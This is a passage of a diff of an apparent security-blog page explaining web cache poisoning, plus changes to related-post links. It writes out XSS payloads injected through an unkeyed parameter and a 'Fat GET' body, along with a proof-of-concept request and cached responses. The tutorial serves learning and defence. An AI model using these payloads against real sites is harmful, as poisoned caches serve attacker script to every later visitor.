+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;refresh&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;https://mytrack.com&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>As before, when sending the initial request to the server, we will receive a cache MISS. So let us inject a simple XSS payload via the unkeyed tracking parameter <code>&quot;&gt;&lt;img/src/onerror=print()&gt;</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl">Content-Type: text/html
+</span></span><span class="line"><span class="cl">Content-Length: 456
+</span></span><span class="line hl"><span class="cl">X-Cache: MISS
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line hl"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;refresh&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;https://&#34;</span><span class="p">&gt;&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="err">/</span><span class="na">onerror</span><span class="o">=</span><span class="s">print()</span><span class="p">&gt;</span> /&gt;
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Welcome, admin!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div>
+<p>Since <span class="text-primary-400">tracking is an unkeyed parameter</span>, anybody who visits the page <code>/page?user=admin</code> will be a victim of the XSS attack.</p>
+
+
+<h2 class="relative group"><i class="fa-solid fa-user-ninja text-primary-400"></i> Advanced Techniques 
+    <div id="i-classfa-solid-fa-user-ninja-text-primary-400i-advanced-techniques" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-user-ninja-text-primary-400i-advanced-techniques" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>There are multiple advanced things we can try to get and escalate a cache poisoning attack. However for now let us focus one just one of those, a <span class="text-primary-400">&ldquo;Fat GET&rdquo;</span>.</p>
+
+
+<h3 class="relative group">Fat GET 
+    <div id="fat-get" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#fat-get" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>A &ldquo;Fat GET&rdquo; request, is when <span class="text-primary-400">we use GET parameters in the post body, while still using the GET verb</span>. If a server is misconfigured it might parse the parameters from the body. With this you can try to create a discrepancy between the webserver and the cache. <span class="text-primary-400">With this we can also use keyed parameters, since they are no longer directly present in the URL</span>. We can then go back and perform an XSS attack the same way we did before.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/page?user=admin&amp;tracking=abc</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">example.com</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line hl"><span class="cl"><span class="g">user=guest</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl">Content-Type: text/html
+</span></span><span class="line"><span class="cl">Content-Length: 456
+</span></span><span class="line"><span class="cl">X-Cache: MISS
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line hl"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Welcome, guest!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/page?user=admin&amp;tracking=abc</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">example.com</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line hl"><span class="cl"><span class="g">user=&lt;/p&gt;&lt;img/src/onerror=print()&gt;&lt;p&gt;</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl">Content-Type: text/html
+</span></span><span class="line"><span class="cl">Content-Length: 456
+</span></span><span class="line"><span class="cl">X-Cache: MISS
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line hl"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Welcome, <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="err">/</span><span class="na">onerror</span><span class="o">=</span><span class="s">print()</span><span class="p">&gt;&lt;</span><span class="nt">p</span><span class="p">&gt;</span>!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div>
+<p>Again, if a victim now opens <code>example.com/page?user=admin</code> the XSS will be loaded from the cache.</p>
+
+
+<h2 class="relative group"><i class="fa-solid fa-book text-primary-400"></i> A Real Life PoC 
+    <div id="i-classfa-solid-fa-book-text-primary-400i-a-real-life-poc" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-book-text-primary-400i-a-real-life-poc" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/?cb=100&amp;&#34;&gt;&lt;image/src/onerror=print()&gt;</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">target-website.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US;q=0.9,en;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="g">HTTP/2 200 OK
+</span></span></span><span class="line"><span class="cl"><span class="g">CACHE: HIT
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">property</span><span class="o">=</span><span class="s">&#34;og:url&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;https://target-website.com/?cb=100&amp;&#34;</span><span class="p">&gt;&lt;</span><span class="nt">image</span><span class="err">/</span><span class="na">src</span><span class="err">/</span><span class="na">onerror</span><span class="o">=</span><span class="s">print()</span><span class="p">&gt;</span>&#34;&gt;
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>In this example, an image tag with an <code>onerror</code> event is injected into the URL parameter. When the server processes this request, the parameter is reflected in the HTML response and cached. Consequently, subsequent users requesting the cached page will execute the malicious JavaScript.</p>
+
           
           
           
@@ -809,6 +1042,86 @@ In this example, an image tag with an onerror event is injected into the URL par
 
 <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
 <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+  
+  
+
+  <a href="/posts/reflected-xss-to-ato/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/reflected-xss-to-ato/feature.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/reflected-xss-to-ato/">Reflected XSS to Account Takeover</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-02-19T00:00:00&#43;00:00">19 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
   
   
 
@@ -1050,86 +1363,6 @@ In this example, an image tag with an onerror event is injected into the URL par
   </a>
 
   
-  
-
-  <a href="/ctfs/glacier-2024/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/ctfs/glacier-2024/featured.svg);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/ctfs/glacier-2024/">Glacier (2024)</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  <time datetime="2025-02-17T00:00:00&#43;00:00">17 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
-  
-
-  
-  
-</div>
-
-
-
-
-
-
-
-
-        </div>
-
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-  
 </section>
 
   
@@ -1164,7 +1397,7 @@ In this example, an image tag with an onerror event is injected into the URL par
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/nosql/">
+            <a class="flex group mr-3" href="/posts/reflected-xss-to-ato/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1176,23 +1409,6 @@ In this example, an image tag with an onerror event is injected into the URL par
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >NoSQL Injection Attacks</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-02-18T00:00:00&#43;00:00">18 February 2025</time>
-                  
-                </span>
-              </span>
-            </a>
-          
-        </span>
-        <span>
-          
-            <a class="flex text-right group ml-3" href="/posts/reflected-xss-to-ato/">
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                   >Reflected XSS to Account Takeover</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
@@ -1201,15 +1417,10 @@ In this example, an image tag with an onerror event is injected into the URL par
                   
                 </span>
               </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
             </a>
+          
+        </span>
+        <span>
           
         </span>
       </div>
